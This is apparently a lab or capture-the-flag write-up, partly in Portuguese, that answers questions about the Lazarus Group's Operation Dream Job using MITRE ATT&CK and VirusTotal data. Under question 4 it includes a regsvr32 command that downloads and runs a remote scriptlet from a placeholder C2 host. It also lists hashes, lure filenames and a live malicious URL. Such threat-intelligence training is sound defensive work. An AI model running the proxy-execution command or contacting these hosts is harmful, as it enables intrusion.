# Solution

You are a junior threat intelligence analyst at a Cybersecurity firm. You have been tasked with investigating a Cyber espionage campaign known as Operation Dream Job. The goal is to gather crucial information about this operation.

https://attack.mitre.org/campaigns/C0022/ (Site do MITRE ATT&CK sobre a campanha Dream Job);

## 1. Who conducted Operation Dream Job?

Operation Dream Job was a cyber espionage operation likely conducted by Lazarus Group that targeted the defense, aerospace, government, and other sectors in the United States, Israel, Australia, Russia, and India.

## 2. When was this operation first observed?

First Seen:  September 2019

## 3. There are 2 campaigns associated with Operation Dream Job. One is Operation North Star, what is the other?

Foram duas: Operation North Star e Operation Interception.

## 4. During Operation Dream Job, there were the two system binaries used for proxy execution. One was Regsvr32, what was the other?

`Regsvr32`: O regsvr32.exe é um programa do Windows que “avisa” ao sistema onde encontrar bibliotecas (arquivos .dll) e controles ActiveX, gravando ou removendo essas informações no Registro do Windows para que outros programas possam usá-los corretamente.O grupo Lazarus hospedou um arquivo de scriptlet COM (extensão .sct) em um servidor remoto e invocou o binário regsvr32.exe com parâmetros que desabilitam o registro e habilitam a execução silenciosa.


Como: regsvr32.exe /s /n /u /i:http://c2.exemplo.com/malicioso.sct scrobj.dll; Evasão de detecção: não há alterações no Registro, o que reduz alertas em ferramentas que monitoram a persistência tradicional.

Isso foi feito conjuntamente com o `Rundll32`: Proxy de execução (T1218.011): permite rodar código malicioso como DLL, em vez de um executável, evitando gatilhos em soluções de segurança que não monitoram rundll32.exe;

## 5. What lateral movement technique did the adversary use?

Lateral Movement: O movimento lateral é a fase de um ataque cibernético em que o invasor, após comprometer um ponto inicial na rede, expande seu acesso a outros sistemas em busca de dados sensíveis, credenciais ou privilégios elevados.

Enterprise	T1534	Internal Spearphishing	
During Operation Dream Job, Lazarus Group conducted internal spearphishing from within a compromised organization.

## 6. What is the technique ID for the previous answer?

T1534 

## 7. What Remote Access Trojan did the Lazarus Group use in Operation Dream Job?

S0694	DRATzarus	During Operation Dream Job, Lazarus Group used DRATzarus to deploy open source software and partly commodity software such as Responder, Wake-On-Lan, and ChromePass to target infected hosts.[1]

## 8. What technique did the malware use for execution?

Enterprise	T1106	Native API	DRATzarus can use various API calls to see if it is running in a sandbox.[1]

## 9. What technique did the malware use to avoid detection in a sandbox?

Enterprise	T1497	.003	Virtualization/Sandbox Evasion: Time Based Evasion	DRATzarus can use the GetTickCount and GetSystemTimeAsFileTime API calls to measure function timing.[1] DRATzarus can also remotely shut down into sleep mode under specific conditions to evade detection.[1]


Similar ao evasion do avast real time (antigo)

## 10. To answer the remaining questions, utilize VirusTotal and refer to the IOCs.txt file. What is the name associated with the first hash provided in the IOC file?

Avaliando a hash (integridade) no virus total: 7bb93be636b332d0a142ff11aedb5bf0ff56deabba3aa02520c85bd99258406f -> IEXPLORE.exe

## 11. When was the file associated with the second hash in the IOC first created?

2020-05-12 19:26:17

## 12. What is the name of the parent execution file associated with the second hash in the IOC?

BAE_HPC_SE.iso -> 

A vítima recebe inicialmente um PDF com a oferta de emprego, que exibe apenas a primeira página e solicita ao usuário que instale um leitor alternativo para visualizar o restante do documento.

O atacante envia então um arquivo ISO contendo dois itens principais: um executável “InternalViewer” (uma versão modificada do Sumatra PDF) e o PDF malicioso completo.

Ao montar o ISO e executar o “InternalViewer.exe”, o leitor carrega o PDF malicioso em memória, contornado o uso de visualizadores legítimos.

O PDF malicioso aciona um segundo estágio que solta dois artefatos no sistema: um atalho LNK na pasta de Inicialização para persistência e uma biblioteca DLL (conhecida como DBLL Dropper) que contém o carregador do RAT.

O atalho LNK garante redundância do ponto de entrada, enquanto o DBLL Dropper decifra e carrega o payload principal do backdoor na memória, estabelecendo comunicação com os servidores de comando e controle.

## 13. Examine the third hash provided. What is the file name likely used in the campaign that aligns with the adversary's known tactics?

Salary_Lockheed_Martin_job_opportunities_confidential.doc


## 14. Which URL was contacted on 2022-08-03 by the file associated with the third hash in the IOC file?

https://markettrendingcenter.com/lk_job_oppor.docx